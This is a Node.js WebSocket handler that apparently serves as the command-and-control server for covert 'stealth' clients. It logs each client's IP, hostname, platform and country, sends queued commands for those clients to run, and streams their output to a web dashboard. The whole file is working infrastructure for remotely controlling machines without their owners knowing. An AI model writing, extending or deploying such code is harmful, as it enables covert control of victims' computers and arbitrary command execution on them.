const mongoose = require('mongoose');
const Client = require('../models/Client');
const Task = require('../models/Task');

// Store all connected web clients for broadcasting
const webClients = new Set();
const stealthClients = new Map(); // Map of uuid -> websocket

// Broadcast function to send data to all web clients
function broadcastToWebClients(data) {
    const message = JSON.stringify(data);
    webClients.forEach(client => {
        if (client.readyState === client.OPEN) {
            client.send(message);
        } else {
            webClients.delete(client);
        }
    });
}

module.exports = function connectionHandler(ws) {
    // Log when a new client connects to help with debugging
    console.log('A new client connected via WebSocket.');

    ws.on('message', async (message) => {
        try {
            // The incoming message is a Buffer, so it must be converted to a string
            // before it can be parsed as JSON. This was the source of the error.
            const messageString = message.toString();
            const data = JSON.parse(messageString);

            // Handle web client identification
            if (data.type === 'web_client') {
                ws.clientType = 'web';
                webClients.add(ws);
                console.log('Web client connected. Total web clients:', webClients.size);
                
                // Send current client list to new web client
                const clients = await Client.find({});
                ws.send(JSON.stringify({
                    type: 'client_list_update',
                    clients: clients
                }));
                return;
            }

            if (data.type === 'output') {
                // This is an output message from a stealth client
                const { taskId, output } = data;
                await Task.findByIdAndUpdate(taskId, { output: output });
                
                // Broadcast task completion to web clients
                broadcastToWebClients({
                    type: 'task_completed',
                    taskId: taskId,
                    output: output
                });
                return;
            }

            // Handle stealth client messages
            if (data.uuid) {
                ws.uuid = data.uuid;
                ws.clientType = 'stealth';
                stealthClients.set(data.uuid, ws);
            } else {
                return; // Ignore messages without a UUID
            }
            
            console.log(`Received data from stealth client ${data.uuid}`);

            // Find the client by UUID and update its details, or create it if it doesn't exist.
            let updatedClient = await Client.findOne({ uuid: data.uuid });
            
            if (updatedClient) {
                // Update existing client
                updatedClient.ip = data.ip || data.ipAddress || 'Unknown';
                updatedClient.ipAddress = data.ipAddress || data.ip || 'Unknown';
                updatedClient.computerName = data.computerName || data.hostname || 'Unknown';
                updatedClient.hostname = data.hostname || 'Unknown';
                updatedClient.platform = data.platform || 'Unknown';
                updatedClient.country = data.country || 'Unknown';
                updatedClient.lastSeen = new Date();
                updatedClient.lastActiveTime = new Date();
                updatedClient.status = 'online';
                await updatedClient.save();
            } else {
                // Create new client
                updatedClient = new Client({
                    uuid: data.uuid,
                    ip: data.ip || data.ipAddress || 'Unknown',
                    ipAddress: data.ipAddress || data.ip || 'Unknown',
                    computerName: data.computerName || data.hostname || 'Unknown',
                    hostname: data.hostname || 'Unknown',
                    platform: data.platform || 'Unknown',
                    country: data.country || 'Unknown',
                    lastSeen: new Date(),
                    lastActiveTime: new Date(),
                    status: 'online'
                });
                await updatedClient.save();
            }

            // Broadcast client status update to all web clients
            broadcastToWebClients({
                type: 'client_status_update',
                client: updatedClient
            });

            // Check for any pending tasks for this client
            const tasks = await Task.find({ uuid: data.uuid, status: 'pending' });
            for (const task of tasks) {
                ws.send(JSON.stringify({ cmd: task.command, taskId: task._id }));
                task.status = 'executed';
                await task.save();
                
                // Broadcast task execution to web clients
                broadcastToWebClients({
                    type: 'task_executed',
                    taskId: task._id,
                    clientUuid: data.uuid,
                    command: task.command
                });
            }

        } catch (err) {
            console.error('WebSocket message processing error:', err);
        }
    });

    ws.on('close', async () => {
        console.log('Client disconnected');
        
        if (ws.clientType === 'web') {
            webClients.delete(ws);
            console.log('Web client disconnected. Total web clients:', webClients.size);
        } else if (ws.uuid && ws.clientType === 'stealth') {
            stealthClients.delete(ws.uuid);
            
            const updatedClient = await Client.findOneAndUpdate(
                { uuid: ws.uuid },
                { $set: { status: 'offline' } },
                { new: true }
            );
            
            // Broadcast client disconnection to all web clients
            if (updatedClient) {
                broadcastToWebClients({
                    type: 'client_status_update',
                    client: updatedClient
                });
            }
        }
    });

    ws.on('error', (error) => {
        console.error('WebSocket error on connection:', error);
    });
};
